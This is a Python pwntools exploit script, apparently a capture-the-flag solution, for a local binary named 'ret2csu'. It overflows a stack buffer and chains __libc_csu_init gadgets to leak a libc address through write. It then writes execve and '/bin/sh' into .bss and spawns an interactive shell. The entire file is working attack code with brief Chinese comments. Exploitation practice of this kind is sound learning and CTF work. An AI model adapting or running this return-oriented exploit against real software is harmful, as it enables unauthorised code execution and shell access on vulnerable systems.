from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p       = process('./ret2csu')
elf     = ELF('./ret2csu')
libc    = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 设置csu执行任意函数
def csu(fun, rdi, rsi, rdx, ret):
    payload  = b'a' * (0x100 + 8)
    payload += p64(0x4012A6)
    payload += p64(0)
    payload += p64(0)   # rbx 
    payload += p64(1)   # rbp
    payload += p64(rdi) # rdi = edi = r12
    payload += p64(rsi) # rsi = r13
    payload += p64(rdx) # rdx = r14
    payload += p64(fun) # r15 = fun
    payload += p64(0x401290)
    payload += p64(0) * 7
    payload += p64(ret)
    p.send(payload)
    
vuln        = elf.sym['vuln']
write_got   = elf.got['write']
read_got    = elf.got['read']
exp         = elf.bss()


# 获取glibc地址
p.recvuntil('Input:\n')
csu(write_got, 1, read_got, 0x8, vuln)
libc_base   = u64(p.recvuntil('\x7f')[-6:].ljust(0x8, b'\x00')) - libc.sym['read']
execve      = libc_base + libc.sym['execve']

# 写入execve和/bin/sh
p.recvuntil('Input:\n')
csu(read_got, 0, exp, 0x10, vuln)
p.recvuntil('Ok.\n')
p.send(p64(execve) + b'/bin/sh\x00')

# 执行execve
p.recvuntil('Input:\n')
csu(exp, exp + 0x8, 0, 0, vuln)

p.interactive()


